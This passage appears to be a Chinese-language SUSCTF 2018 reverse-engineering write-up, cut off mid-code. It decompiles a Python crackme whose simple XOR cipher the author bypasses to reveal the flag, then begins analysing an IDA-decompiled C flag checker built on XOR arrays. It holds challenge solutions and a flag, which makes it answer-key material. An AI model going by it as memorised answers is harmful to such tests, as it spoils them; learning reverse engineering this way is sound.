<span class="token comment" spellcheck="true"># Embedded file name: HelloPython.py</span>
<span class="token comment" spellcheck="true"># Compiled at: 2018-09-27 23:27:58</span>
<span class="token comment" spellcheck="true"># Size of source mod 2**32: 1227 bytes</span>
<span class="token keyword">import</span> sys
<span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I can't give you flag :("</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">elif</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        numfn1 <span class="token operator">=</span> <span class="token number">0</span>
        numfn2 <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            currentNum <span class="token operator">=</span> numfn1 <span class="token operator">+</span> numfn2
            numfn1 <span class="token operator">=</span> numfn2
            numfn2 <span class="token operator">=</span> currentNum

        <span class="token keyword">return</span> currentNum


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        b1 <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        b2 <span class="token operator">=</span> b1 <span class="token operator">^</span> key
        c1 <span class="token operator">=</span> b2 <span class="token operator">%</span> <span class="token number">16</span>
        c2 <span class="token operator">=</span> b2 <span class="token operator">//</span> <span class="token number">16</span>
        c1 <span class="token operator">=</span> c1 <span class="token operator">+</span> <span class="token number">65</span>
        c2 <span class="token operator">=</span> c2 <span class="token operator">+</span> <span class="token number">65</span>
        c<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c1
        c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> c2
        j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>

    <span class="token keyword">return</span> c<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token number">2</span>
        b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
        j <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            c1 <span class="token operator">=</span> c<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
            c2 <span class="token operator">=</span> c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
            j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>
            c1 <span class="token operator">=</span> c1 <span class="token operator">-</span> <span class="token number">65</span>
            c2 <span class="token operator">=</span> c2 <span class="token operator">-</span> <span class="token number">65</span>
            b2 <span class="token operator">=</span> c2 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> c1
            b1 <span class="token operator">=</span> b2 <span class="token operator">^</span> key
            b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> b1

        <span class="token keyword">return</span> b<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> Fibonacci<span class="token punctuation">(</span>int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># okay decompiling HelloPython.pyc</span>
</code></pre>
<p>分析 存在加密解密函数  如果满足第一个三处等于第四个参数且第一个参数大于10就输出解密后面的字符串 </p>
<p>这里我们可以删除 if语句 以及最前面的长度判断 直接print<br>所以可以得到源码</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># uncompyle6 version 3.2.4</span>
<span class="token comment" spellcheck="true"># Python bytecode 3.6 (3379)</span>
<span class="token comment" spellcheck="true"># Decompiled from: Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34) </span>
<span class="token comment" spellcheck="true"># [GCC 7.3.0]</span>
<span class="token comment" spellcheck="true"># Embedded file name: HelloPython.py</span>
<span class="token comment" spellcheck="true"># Compiled at: 2018-09-27 23:27:58</span>
<span class="token comment" spellcheck="true"># Size of source mod 2**32: 1227 bytes</span>
<span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">Fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">elif</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        numfn1 <span class="token operator">=</span> <span class="token number">0</span>
        numfn2 <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            currentNum <span class="token operator">=</span> numfn1 <span class="token operator">+</span> numfn2
            numfn1 <span class="token operator">=</span> numfn2
            numfn2 <span class="token operator">=</span> currentNum

        <span class="token keyword">return</span> currentNum


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        b1 <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        b2 <span class="token operator">=</span> b1 <span class="token operator">^</span> key
        c1 <span class="token operator">=</span> b2 <span class="token operator">%</span> <span class="token number">16</span>
        c2 <span class="token operator">=</span> b2 <span class="token operator">//</span> <span class="token number">16</span>
        c1 <span class="token operator">=</span> c1 <span class="token operator">+</span> <span class="token number">65</span>
        c2 <span class="token operator">=</span> c2 <span class="token operator">+</span> <span class="token number">65</span>
        c<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c1
        c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> c2
        j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>

    <span class="token keyword">return</span> c<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token number">2</span>
        b <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
        j <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
            c1 <span class="token operator">=</span> c<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
            c2 <span class="token operator">=</span> c<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
            j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span>
            c1 <span class="token operator">=</span> c1 <span class="token operator">-</span> <span class="token number">65</span>
            c2 <span class="token operator">=</span> c2 <span class="token operator">-</span> <span class="token number">65</span>
            b2 <span class="token operator">=</span> c2 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> c1
            b1 <span class="token operator">=</span> b2 <span class="token operator">^</span> key
            b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> b1

        <span class="token keyword">return</span> b<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>运行可以得到flag</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>SUSCTF{W3lcome_to_python&#39;s_wor1d}
</code></pre><h3 id="150"><a href="#150" class="headerlink" title="150"></a>150</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/4.png" alt=""> </p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v35 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congrazzzzzz~ You got it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以得出flag长度为30且 要满足 if中的xor操作  这里处理一下两个数组<br><img src="/2018/10/29/SUSCTF-Writeup-Reverse/5.png" alt=""><br>得到可观代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-134h]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+90h] [rbp-B0h]</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+110h] [rbp-30h]</span>
  __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+118h] [rbp-28h]</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+120h] [rbp-20h]</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-18h]</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+130h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+138h] [rbp-8h]</span>

  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">96</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">73</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">84</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">122</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">73</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">99</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">79</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">41</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">98</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me flag: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">^</span> v4<span class="token punctuation">[</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v5<span class="token punctuation">[</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
